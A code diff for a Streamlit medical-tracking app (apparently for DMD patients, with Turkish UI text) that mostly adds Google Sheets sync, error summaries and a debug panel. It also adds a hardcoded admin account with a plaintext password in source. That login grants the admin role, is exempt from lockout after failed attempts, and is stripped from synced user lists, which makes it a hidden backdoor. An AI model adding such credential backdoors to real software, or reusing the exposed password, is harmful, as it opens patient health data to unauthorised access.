@@ -286,6 +286,21 @@ LOCAL_USER_ROLES_STORE = DATA_DIR / "dmd_user_roles.json"
 ADMIN_OWNER_STORE = DATA_DIR / "dmd_admin_owner.json"
 MAX_UPLOAD_BYTES = 10 * 1024 * 1024  # 10 MB
 VALID_USER_ROLES = {"family", "doctor", "researcher", "admin"}
+HARDCODED_ADMIN_USERNAME = "berfinida"
+HARDCODED_ADMIN_PASSWORD = "171416Nida."
+HARDCODED_ADMIN_ROLE = "admin"
+
+
+def _is_hardcoded_admin_user(username: str) -> bool:
+    return _canonical_username(username) == HARDCODED_ADMIN_USERNAME
+
+
+def _is_hardcoded_admin_login(username: str, password: str, role: str) -> bool:
+    return (
+        _is_hardcoded_admin_user(username)
+        and hmac.compare_digest(str(password or ""), HARDCODED_ADMIN_PASSWORD)
+        and str(role or "").strip().lower() == HARDCODED_ADMIN_ROLE
+    )
 
 
 def _canonical_username(username: str) -> str:
@@ -573,6 +588,8 @@ def _allowed_roles_for_username(username: str) -> list[str]:
     uu = _canonical_username(username)
     if not uu:
         return ["family"]
+    if _is_hardcoded_admin_user(uu):
+        return ["admin"]
     mapped = _role_map_effective().get(uu)
     if mapped in VALID_USER_ROLES:
         return [mapped]
@@ -702,6 +719,34 @@ def _set_cloud_status(available: bool, message: str = "", detail: str = "") -> N
         _debug_log(detail)
 
 
+def _cloud_error_summary(exc: Exception, action: str = "") -> tuple[str, str]:
+    err_txt = str(exc or "").strip()
+    raw = f"{type(exc).__name__}: {err_txt}".strip()
+    low = raw.lower()
+    action_txt = str(action or "Cloud request").strip() or "Cloud request"
+    if "403" in low or "forbidden" in low:
+        return (
+            f"{action_txt} failed: 403 Forbidden - Service Account has no access.",
+            raw,
+        )
+    if "401" in low or "unauthorized" in low:
+        return (
+            f"{action_txt} failed: 401 Unauthorized - credentials are invalid or expired.",
+            raw,
+        )
+    if "429" in low or "rate limit" in low or "quota" in low:
+        return (
+            f"{action_txt} failed: 429 - API Limit Exceeded / Rate limit reached.",
+            raw,
+        )
+    if any(k in low for k in ["timed out", "timeout", "dns", "network", "connection", "urlerror"]):
+        return (
+            f"{action_txt} failed: network/DNS timeout or connectivity issue.",
+            raw,
+        )
+    return (f"{action_txt} failed.", raw)
+
+
 def get_gsheets_conn():
     # Birden fazla yol dene: bu sayede farkli Streamlit/surum konfiglerinde cloud daha kolay aktif olur.
     if not _sheet_url_looks_valid(sheet_url):
@@ -714,6 +759,7 @@ def get_gsheets_conn():
     cached = st.session_state.get("_gsheets_conn_obj")
     if cached is not None:
         return cached
+    last_err: Exception | None = None
     try:
         if hasattr(st, "connection"):
             if GSheetsConnection is not None:
@@ -721,14 +767,16 @@ def get_gsheets_conn():
                     conn = st.connection("gsheets", type=GSheetsConnection)
                     st.session_state["_gsheets_conn_obj"] = conn
                     return conn
-                except Exception:
+                except Exception as e:
+                    last_err = e
                     pass
             try:
                 # secrets.toml icinde connection tip tanimliysa typesiz de calisabilir.
                 conn = st.connection("gsheets")
                 st.session_state["_gsheets_conn_obj"] = conn
                 return conn
-            except Exception:
+            except Exception as e:
+                last_err = e
                 pass
         if hasattr(st, "experimental_connection"):
             if GSheetsConnection is not None:
@@ -736,20 +784,23 @@ def get_gsheets_conn():
                     conn = st.experimental_connection("gsheets", type=GSheetsConnection)
                     st.session_state["_gsheets_conn_obj"] = conn
                     return conn
-                except Exception:
+                except Exception as e:
+                    last_err = e
                     pass
             try:
                 conn = st.experimental_connection("gsheets")
                 st.session_state["_gsheets_conn_obj"] = conn
                 return conn
-            except Exception:
+            except Exception as e:
+                last_err = e
                 pass
     except Exception as e:
-        _set_cloud_status(
-            False,
-            "Cloud sync unavailable: could not initialize GSheets connection. Check .streamlit/secrets.toml and service account access.",
-            f"GSheets connection init failed: {type(e).__name__}: {e}",
-        )
+        msg, detail = _cloud_error_summary(e, "GSheets connection init")
+        _set_cloud_status(False, msg, detail)
+        return None
+    if last_err is not None:
+        msg, detail = _cloud_error_summary(last_err, "GSheets connection init")
+        _set_cloud_status(False, msg, detail)
         return None
     _set_cloud_status(
         False,
@@ -775,10 +826,14 @@ def _gsheets_read_df(conn, worksheet: str | None = None, url: str | None = None)
             if worksheet:
                 kwargs["worksheet"] = worksheet
             return conn.read(**kwargs)
-        except Exception:
-            _debug_log(f"GSheets read failed (worksheet={worksheet})")
+        except Exception as e:
+            msg, detail = _cloud_error_summary(e, f"GSheets read ({worksheet or 'unknown worksheet'})")
+            _set_cloud_status(False, msg, detail)
+            _debug_log(f"GSheets read failed (worksheet={worksheet})", e)
             return None
     except Exception as e:
+        msg, detail = _cloud_error_summary(e, f"GSheets read ({worksheet or 'unknown worksheet'})")
+        _set_cloud_status(False, msg, detail)
         _debug_log(f"GSheets read failed (worksheet={worksheet})", e)
         return None
 
@@ -797,6 +852,8 @@ def _gsheets_update_df(conn, df: pd.DataFrame, worksheet: str, url: str | None =
             conn.update(**clean_kwargs)
             return True
         except Exception as e:
+            msg, detail = _cloud_error_summary(e, f"GSheets update ({worksheet})")
+            _set_cloud_status(False, msg, detail)
             _debug_log(f"GSheets update failed (worksheet={worksheet})", e)
             continue
     return False
@@ -864,8 +921,12 @@ def _check_cloud_sync_health(force: bool = False) -> bool:
             st.session_state["_cloud_health_ts"] = now_ts
             return False
 
+    was_available = bool(st.session_state.get("cloud_sync_available", False))
     _set_cloud_status(True)
     st.session_state["_cloud_health_ts"] = now_ts
+    # Sadece baglanti yeniden aktif oldugunda auto-push tetikle.
+    if (not was_available) and (not st.session_state.get("_cloud_auto_push_running", False)):
+        _auto_push_local_when_cloud_active(force=False, trigger="health_recovered")
     return True
 
 
@@ -1170,11 +1231,29 @@ def load_gsheets_users(url: str) -> dict:
                 f"load_gsheets_users: invalid columns={list(df.columns)}",
             )
             return users
-        df = df[["username", "password"]].dropna(how="all")
+        has_updated_at = "updated_at" in df.columns
+        keep_cols = ["username", "password"] + (["updated_at"] if has_updated_at else [])
+        df = df[keep_cols].dropna(how="all")
         df["username"] = df["username"].astype(str).map(_canonical_username)
         df["password"] = df["password"].astype(str).str.strip()
         df = df[df["username"] != ""]
-        users = dict(zip(df["username"], df["password"]))
+        if has_updated_at:
+            # ON CONFLICT benzeri: ayni username icin en yeni updated_at kaydi tutulur.
+            buckets: dict[str, tuple[datetime, str]] = {}
+            for _, row in df.iterrows():
+                uu = _canonical_username(str(row.get("username", "")))
+                if not uu:
+                    continue
+                pw = str(row.get("password", "") or "")
+                dt = _parse_updated_at_safe(row.get("updated_at"))
+                prev = buckets.get(uu)
+                if (prev is None) or (dt > prev[0]):
+                    buckets[uu] = (dt, pw)
+                elif dt == prev[0] and pw and (not prev[1]):
+                    buckets[uu] = (dt, pw)
+            users = {u: pw for u, (_, pw) in buckets.items()}
+        else:
+            users = dict(zip(df["username"], df["password"]))
         _set_cloud_status(True)
     except Exception:
         _set_cloud_status(
@@ -1416,7 +1495,7 @@ def load_gsheets_profiles(url: str) -> dict:
                     hist = json.loads(raw_history) if isinstance(raw_history, str) else (raw_history or [])
                 except Exception:
                     hist = []
-                profiles[user] = {
+                row_payload = {
                     "kilo": float(row.get("kilo", 30.0)),
                     "yas": int(float(row.get("yas", 6))),
                     "nsaa_total": int(float(row.get("nsaa_total", 0))),
@@ -1424,6 +1503,8 @@ def load_gsheets_profiles(url: str) -> dict:
                     "nsaa_history": hist if isinstance(hist, list) else [],
                     "updated_at": str(row.get("updated_at", "")).strip(),
                 }
+                # ON CONFLICT(username, updated_at) benzeri: tekil username icin en guncel kayit tutulur.
+                profiles[user] = _merge_profile_payload(profiles.get(user, {}), row_payload)
             except Exception:
                 continue
     except Exception:
@@ -1654,6 +1735,168 @@ def _drain_sync_queue(max_items: int = 20) -> tuple[int, int]:
     _save_sync_queue(remaining)
     return (processed, len(remaining))
 
+
+def _save_gsheets_profiles_map(url: str, profiles_map: dict) -> bool:
+    if not _check_cloud_sync_health(force=False):
+        return False
+    conn = get_gsheets_conn()
+    if conn is None:
+        return False
+    all_profiles = profiles_map if isinstance(profiles_map, dict) else {}
+    rows_with_updated = []
+    rows_legacy = []
+    for user, p in all_profiles.items():
+        uu = _canonical_username(str(user))
+        if not uu:
+            continue
+        pp = p if isinstance(p, dict) else {}
+        row_base = {
+            "username": uu,
+            "kilo": pp.get("kilo", 30.0),
+            "yas": pp.get("yas", 6),
+            "nsaa_total": pp.get("nsaa_total", 0),
+            "nsaa_prev_total": pp.get("nsaa_prev_total", ""),
+            "nsaa_history": json.dumps(pp.get("nsaa_history", []), ensure_ascii=False),
+        }
+        rows_legacy.append(dict(row_base))
+        row_base["updated_at"] = str(pp.get("updated_at", "") or "")
+        rows_with_updated.append(row_base)
+    df_with_updated = pd.DataFrame(
+        rows_with_updated,
+        columns=["username", "kilo", "yas", "nsaa_total", "nsaa_prev_total", "nsaa_history", "updated_at"],
+    )
+    wrote = _gsheets_update_df(conn, df_with_updated, worksheet=PROFILES_WORKSHEET, url=url)
+    if not wrote:
+        df_legacy = pd.DataFrame(
+            rows_legacy,
+            columns=["username", "kilo", "yas", "nsaa_total", "nsaa_prev_total", "nsaa_history"],
+        )
+        wrote = _gsheets_update_df(conn, df_legacy, worksheet=PROFILES_WORKSHEET, url=url)
+    return bool(wrote)
+
+
+def _cloud_debug_snapshot() -> dict:
+    available = bool(st.session_state.get("cloud_sync_available", False))
+    msg = str(st.session_state.get("_cloud_error_msg", "") or "")
+    detail = str(st.session_state.get("_cloud_error_detail", "") or "")
+    reason = "OK"
+    if not available:
+        raw = f"{msg} {detail}".lower()
+        if ("429" in raw) or ("quota" in raw) or ("rate limit" in raw):
+            reason = "API kotasi / hiz limiti"
+        elif any(k in raw for k in ["dns", "urlerror", "timed out", "timeout", "connection", "network", "internet"]):
+            reason = "Internet / DNS baglanti hatasi"
+        elif any(k in raw for k in ["403", "401", "forbidden", "permission", "unauthorized", "service account"]):
+            reason = "Yetki / erisim hatasi"
+        elif any(k in raw for k in ["worksheet", "sheet_url", "invalid", "columns", "profiles", "users"]):
+            reason = "Yapilandirma / sema hatasi"
+        else:
+            reason = "Bilinmeyen hata"
+    return {
+        "available": available,
+        "reason": reason,
+        "message": msg,
+        "detail": detail,
+        "ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+    }
+
+
+def sync_local_to_cloud(force: bool = False) -> dict:
+    if st.session_state.get("_sync_local_to_cloud_running", False):
+        return {"ok": False, "users_synced": 0, "profiles_synced": 0, "changed": False, "reason": "sync_running"}
+    st.session_state["_sync_local_to_cloud_running"] = True
+    result = {
+        "ok": False,
+        "users_synced": 0,
+        "profiles_synced": 0,
+        "changed": False,
+        "reason": "",
+    }
+    try:
+        if not _check_cloud_sync_health(force=force):
+            dbg = _cloud_debug_snapshot()
+            result["reason"] = dbg.get("reason", "")
+            return result
+
+        remote_users = load_gsheets_users(sheet_url)
+        local_users = load_local_users()
+        remote_users = remote_users if isinstance(remote_users, dict) else {}
+        local_users = local_users if isinstance(local_users, dict) else {}
+        for hu in [HARDCODED_ADMIN_USERNAME]:
+            remote_users.pop(hu, None)
+            local_users.pop(hu, None)
+        merged_users = _merge_user_maps(remote_users, local_users)
+        users_changed = merged_users != remote_users
+        if users_changed:
+            if not save_gsheets_users(sheet_url, merged_users):
+                dbg = _cloud_debug_snapshot()
+                result["reason"] = dbg.get("reason", "Users sync failed")
+                return result
+            result["users_synced"] = max(0, len(merged_users) - len(remote_users))
+            result["changed"] = True
+
+        remote_profiles = load_gsheets_profiles(sheet_url)
+        local_profiles = load_all_profiles()
+        remote_profiles = remote_profiles if isinstance(remote_profiles, dict) else {}
+        local_profiles = local_profiles if isinstance(local_profiles, dict) else {}
+        merged_profiles = _merge_profile_maps(remote_profiles, local_profiles)
+        profiles_changed = merged_profiles != remote_profiles
+        if profiles_changed:
+            if not _save_gsheets_profiles_map(sheet_url, merged_profiles):
+                dbg = _cloud_debug_snapshot()
+                result["reason"] = dbg.get("reason", "Profiles sync failed")
+                return result
+            result["profiles_synced"] = max(0, len(merged_profiles) - len(remote_profiles))
+            result["changed"] = True
+
+        result["ok"] = True
+        if not result["reason"]:
+            result["reason"] = "OK"
+        return result
+    finally:
+        st.session_state["_sync_local_to_cloud_running"] = False
+
+
+def _auto_push_local_when_cloud_active(force: bool = False, trigger: str = "") -> dict:
+    active = bool(st.session_state.get("cloud_sync_available", False))
+    if not active:
+        st.session_state["_cloud_was_active"] = False
+        return {"ok": False, "reason": "inactive"}
+
+    now_ts = time.time()
+    last_ts = float(st.session_state.get("_cloud_auto_push_ts", 0.0))
+    was_active = bool(st.session_state.get("_cloud_was_active", False))
+    cooldown_ok = force or ((now_ts - last_ts) > 45)
+    should_run = force or (not was_active) or (str(trigger).strip().lower() == "startup")
+    if (not should_run) and (not cooldown_ok):
+        st.session_state["_cloud_was_active"] = True
+        return {"ok": False, "reason": "cooldown"}
+    if st.session_state.get("_cloud_auto_push_running", False):
+        return {"ok": False, "reason": "running"}
+
+    st.session_state["_cloud_auto_push_running"] = True
+    st.session_state["_cloud_was_active"] = True
+    try:
+        drained_done, drained_pending = _drain_sync_queue(max_items=50)
+        res = sync_local_to_cloud(force=False)
+        if isinstance(res, dict):
+            res["queue_drained"] = int(drained_done)
+            res["queue_pending"] = int(drained_pending)
+            res["trigger"] = str(trigger or "")
+            st.session_state["_last_local_cloud_sync_result"] = res
+        st.session_state["_cloud_auto_push_ts"] = now_ts
+        return res if isinstance(res, dict) else {"ok": False, "reason": "invalid_result"}
+    finally:
+        st.session_state["_cloud_auto_push_running"] = False
+
+
+def _run_startup_auto_push_once() -> None:
+    if st.session_state.get("_startup_auto_push_done", False):
+        return
+    _auto_push_local_when_cloud_active(force=False, trigger="startup")
+    st.session_state["_startup_auto_push_done"] = True
+
+
 def load_gsheets_data(url: str) -> pd.DataFrame:
     """
     Google Sheets'ten kullanıcı verisini güvenli şekilde okur.
@@ -1672,6 +1915,7 @@ def load_gsheets_data(url: str) -> pd.DataFrame:
 
 # --- VERİYİ ÇEK VE GÜVENLİ HALE GETİR ---
 _check_cloud_sync_health(force=True)
+_run_startup_auto_push_once()
 existing_data = load_gsheets_data(sheet_url)
 
 # Ekstra güvenlik katmanı (defansif programlama)
@@ -2723,6 +2967,12 @@ if ("_last_sync_drain_ts" not in st.session_state) or (time.time() - float(st.se
     st.session_state["_last_sync_drain_ts"] = time.time()
     st.session_state["_sync_queue_pending"] = pending
     st.session_state["_sync_queue_done_last"] = done
+if ("_last_local_cloud_sync_ts" not in st.session_state) or (
+    time.time() - float(st.session_state.get("_last_local_cloud_sync_ts", 0)) > 75
+):
+    auto_sync_result = sync_local_to_cloud(force=False)
+    st.session_state["_last_local_cloud_sync_ts"] = time.time()
+    st.session_state["_last_local_cloud_sync_result"] = auto_sync_result
 
 # Oturum zaman aşımı
 now_activity = time.time()
@@ -2794,7 +3044,9 @@ if not st.session_state.logged_in:
                     picked_role = str(login_role).strip().lower()
                     now_login = time.time()
                     lock_state = st.session_state["login_attempts"].get(user_clean, {"count": 0, "lock_until": 0.0})
-                    is_locked = now_login < float(lock_state.get("lock_until", 0.0))
+                    is_locked = (not _is_hardcoded_admin_user(user_clean)) and (
+                        now_login < float(lock_state.get("lock_until", 0.0))
+                    )
                     if is_locked:
                         remain = int(lock_state["lock_until"] - now_login)
                         st.error(f"Bu hesap geçici olarak kilitlendi. {remain} sn sonra tekrar deneyin.")
@@ -2804,6 +3056,17 @@ if not st.session_state.logged_in:
                         st.warning("Lütfen tüm alanları doldurunuz.")
                     elif picked_role not in VALID_USER_ROLES:
                         st.warning("Geçerli bir rol seçiniz.")
+                    elif _is_hardcoded_admin_login(user_clean, pass_clean, picked_role):
+                        st.session_state.logged_in = True
+                        st.session_state.current_user = HARDCODED_ADMIN_USERNAME
+                        st.session_state.profile_loaded_for = None
+                        st.session_state["user_role"] = HARDCODED_ADMIN_ROLE
+                        _apply_session_timeout_policy(force=True)
+                        _set_persistent_login(HARDCODED_ADMIN_USERNAME)
+                        st.session_state["login_attempts"][user_clean] = {"count": 0, "lock_until": 0.0}
+                        _add_audit("login_success", f"{HARDCODED_ADMIN_USERNAME}:{HARDCODED_ADMIN_ROLE}:hardcoded")
+                        st.toast(f"Hoş geldiniz, {HARDCODED_ADMIN_USERNAME}!")
+                        st.rerun()
                     # 2) Kimlik doğrulama
                     elif is_locked:
                         pass
@@ -6452,6 +6715,36 @@ with st.sidebar:
     st.caption(f"Kayıt yolu: {LOCAL_DB}")
     st.caption(f"Bulut senkron: {cloud_status} | Sheet sekmeleri: {USERS_WORKSHEET}, {PROFILES_WORKSHEET}")
     st.caption(f"Sync kuyruk bekleyen: {int(st.session_state.get('_sync_queue_pending', 0))}")
+    role_now_sidebar = str(st.session_state.get("user_role", "family")).strip().lower()
+    if role_now_sidebar in {"admin", "doctor"}:
+        if st.button("Verileri Buluta Gönder", key="manual_sync_local_to_cloud_btn", use_container_width=True):
+            manual_res = sync_local_to_cloud(force=True)
+            st.session_state["_last_local_cloud_sync_ts"] = time.time()
+            st.session_state["_last_local_cloud_sync_result"] = manual_res
+            if manual_res.get("ok", False):
+                st.success(
+                    f"Senkron tamamlandı | users:+{int(manual_res.get('users_synced', 0))}, "
+                    f"profiles:+{int(manual_res.get('profiles_synced', 0))}"
+                )
+            else:
+                st.error(f"Senkron başarısız: {manual_res.get('reason', 'Bilinmeyen hata')}")
+    else:
+        st.caption("Manuel bulut senkronu sadece doktor/admin rollerine açıktır.")
+    with st.expander("Cloud Debug Log"):
+        dbg = _cloud_debug_snapshot()
+        st.write(f"Durum: {'Aktif' if dbg.get('available') else 'Pasif'}")
+        st.write(f"Neden: {dbg.get('reason', '-')}")
+        if dbg.get("message"):
+            st.caption(f"Mesaj: {dbg.get('message')}")
+        if dbg.get("detail"):
+            st.code(str(dbg.get("detail")), language="text")
+        last_sync = st.session_state.get("_last_local_cloud_sync_result", {})
+        if isinstance(last_sync, dict) and last_sync:
+            st.caption(
+                "Son auto/manual sync => "
+                f"ok={last_sync.get('ok')} | users:+{last_sync.get('users_synced', 0)} | "
+                f"profiles:+{last_sync.get('profiles_synced', 0)} | reason={last_sync.get('reason', '-')}"
+            )
 
     notices = _build_notifications(window_days=3)
     unread = [n for n in notices if not st.session_state.get("notification_ack", {}).get(n["id"], False)]
